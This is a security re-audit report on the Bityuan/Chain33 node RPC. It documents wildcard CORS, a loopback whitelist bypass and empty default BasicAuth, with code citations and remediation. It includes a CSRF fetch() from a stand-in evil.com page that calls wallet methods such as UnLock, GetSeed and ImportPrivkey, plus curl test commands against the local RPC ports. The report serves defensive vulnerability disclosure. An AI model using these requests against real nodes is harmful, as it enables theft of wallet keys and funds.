# Bityuan RPC Auth Re-Audit — CORS + Loopback + BasicAuth + Whitelist (2026-08 AUDITOR-1)

Condensed adversarial validation from `/tmp/audit_rpc.md` + `/tmp/chain33src` on-disk verification.

## Verdict
PARTIALLY CONFIRMED with strict prerequisites. Both RPC stacks wildcard CORS, both trust loopback for IP WL, JRPC skips func WL/BL for loopback, BasicAuth default-empty. Default `bityuan.toml` binds `localhost` only → remote direct blocked; exploit requires browser same-host CSRF or local SSRF. If rebound to `0.0.0.0` + `whitelist=["*"]`, critical remote admin.

## Evidence (file:line proven)

| Claim | File:line | Evidence |
|---|---|---|
| `cors.New(cors.Options{})` = `*` | `rpc/http.go:56` vs `rs/cors@v1.7.0/cors.go:39,123-127,339-341` | Empty `AllowedOrigins` → `allowedOriginsAll=true` → `Access-Control-Allow-Origin: *`. Default `AllowedMethods` = GET,POST,HEAD; `AllowedHeaders` = Origin,Accept,Content-Type,X-Requested-With. Preflight for `application/json` passes; `Authorization` fails (no `*`). |
| EthRPC CORS `*` | `rpc/ethrpc/rpc.go:143` → `geth v1.10.22/node/rpcstack.go:376-393` | `node.NewHTTPHandlerStack(srv, []string{"*"}, []string{"*"}, nil)` → `newCorsHandler` with `AllowedOrigins:["*"], AllowedHeaders:["*"]` + `vhosts ["*"]` disables DNS-rebinding. |
| Loopback skips func WL/BL | `rpc/http.go:95-102` | `if !ipaddr.IsLoopback(){ if checkJrpcFuncBlacklist || !checkJrpcFuncWhitelist {deny}}` |
| `checkIPWhitelist` loopback→true | `rpc/server.go:198-214` + `rpc/ethrpc/rpc.go:248-268` | `if ip.IsLoopback(){return true}` before `0.0.0.0`/exact map. Covers `127.0.0.0/8` + `::1`; `::ffff:127.0.0.1` is NOT loopback in Go. `RemoteAddr` via `net.SplitHostPort(r.RemoteAddr)` not spoofable via XFF. |
| BasicAuth empty→true | `rpc/server.go:171-191` + `bityuan.toml:75-84` | `if JrpcUserName=="" && JrpcUserPasswd=="" {return true}`; default toml has no creds. `server_test.go:51-69` confirms. EthRPC `ServeHTTP:218-246` has **no** `checkBasicAuth` at all. |
| `isLoopBackAddr` bug | `rpc/http.go:159-164,169` | Only `*net.IPNet` → always false for gRPC `*net.TCPAddr`; falls through to correct `checkIPWhitelist` so loopback still passes. Not escalation, just inconsistency (JRPC loopback bypasses WL, gRPC would not if WL locked). |
| Default bind blocks remote | `bityuan.toml:76-78,87-90` + `types/defaultcfg.go:91` | `jrpcBindAddr="localhost:8801"` + `grpcBindAddr="localhost:8802"` + `eth 8546/8547` → `net.Listen("tcp","localhost:8801")` = `127.0.0.1` only. `whitelist=["127.0.0.1"]` (`server.go:552-554`). |

## Exploitation

**CSRF same-host (CONFIRMED):** `evil.com` → `fetch("http://127.0.0.1:8801/", {method:"POST", headers:{"Content-Type":"application/json"}, body:'{"method":"Chain33.UnLock",...}'})`
Preflight: `Origin:evil.com`, `Access-Control-Request-Method:POST`, `Access-Control-Request-Headers:content-type` → `isOriginAllowed true` → `200` with `Access-Control-Allow-Origin:*` + `Access-Control-Allow-Headers:Content-Type` → actual POST sees `RemoteAddr=127.0.0.1` → `checkIPWhitelist true` → `checkBasicAuth true` → `IsLoopback true` → skip WL/BL → `ServeRequest` executes `UnLock/GetSeed/ImportPrivkey/SignRawTx/CreateRawTransaction/SendTransaction`. Response readable via CORS `*`. EthRPC `personal_unlockAccount/importRawKey/sign→DumpPrivkey` same path via `geth` `*` (allows any header).

**BasicAuth mitigation (adversarial finding):** If `JrpcUserName/Passwd` set, `Authorization` header triggers preflight `areHeadersAllowed` failure on `rs/cors` defaults → browser blocks CSRF. EthRPC still passes (`AllowedHeaders:["*"]`).

**Direct remote (BLOCKED by default, gated):** Needs `jrpcBindAddr=0.0.0.0:8801` AND (`whitelist=["*"]` or `["0.0.0.0"]` or attacker IP). Default `whitelist=["127.0.0.1"]` → remote `1.2.3.4` → `IsLoopback false` → map miss → `403 Address is not authorized!`.

## Kill-tests (curl)

```bash
# JRPC CORS + loopback pass
curl -i http://127.0.0.1:8801/ -H "Origin: http://evil.com" -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"Chain33.GetAccounts","id":1,"params":[{"withoutBalance":false}]}'
# privileged method loopback skip
curl -s http://127.0.0.1:8801/ -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"Chain33.UnLock","id":1,"params":[{"passwd":"test","timeout":0}]}'
# ethrpc zero-auth
curl -i http://127.0.0.1:8546/ -H "Origin: http://evil.com" -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"personal_listAccounts","id":1,"params":[]}'
curl -s http://127.0.0.1:8546/ -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"admin_datadir","id":1,"params":[]}'
# XFF ignored
curl -s http://127.0.0.1:8801/ -H "X-Forwarded-For: 127.0.0.1" -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"Chain33.Version","id":1,"params":[{}]}'
```

## Re-audit Methodology (reuse)
1. Read `rs/cors` source for `New(Options{})` default (not assumption).
2. Trace `Listen()` handler ordering + every `checkIPWhitelist/checkBasicAuth/checkJrpcFunc*` call with line numbers.
3. Trace both `server.go` and `ethrpc/rpc.go` `checkIPWhitelist` variants + `InitIPWhitelist` (`whitelist` vs `Whitlist` legacy).
4. Verify `isLoopBackAddr` type assertion against real `net.TCPAddr` from `peer.FromContext`.
5. Check `bityuan.toml` + `types/cfg.go:289-311` + `types/defaultcfg.go:91` for actual defaults vs operator overrides.
6. Prove preflight behavior for `application/json` vs `Authorization`.
7. Prove `RemoteAddr` not spoofable.
8. Classify each claim VERIFIED FACT vs ASSUMPTION with line citations.

## Remediation
- JRPC: replace `cors.New(cors.Options{})` with explicit configurable `AllowedOrigins`; default deny.
- EthRPC: `NewHTTPHandlerStack(...["*"],["*"])` → config-driven or `[]` (disabled); `*` vhosts defeats DNS rebinding.
- Remove `if !IsLoopback()` func WL bypass or gate behind `EnableDebug`.
- Document `IsLoopback` override of whitelist; make explicit.
- Generate random `JrpcUserName/Passwd` on init or enforce when bind is not localhost; add `checkBasicAuth` to ethrpc `ServeHTTP`.
- Lint `0.0.0.0` + `whitelist=["*"]` + empty auth.
- Fix `isLoopBackAddr` to handle `*net.TCPAddr` + `net.ParseIP(SplitHostPort(a.String()))`.

## Host Quirk (TencentOS go1.23)
Duplicate stdlib files `runtime/mbitmap_noallocheaders.go`, `runtime/msize_noallocheaders.go`, `runtime/exithook.go`, `syscall/flock_linux.go`, `os/zero_copy_linux.go` cause `go run` redeclared errors; `rm -f` dupes restores toolchain. Validate via `go run /tmp/testloop2.go` checking `IsLoopback` for `127.0.0.2`, `::1`, `::ffff:127.0.0.1`, and `isLoopBackAddr` on `*net.TCPAddr`.
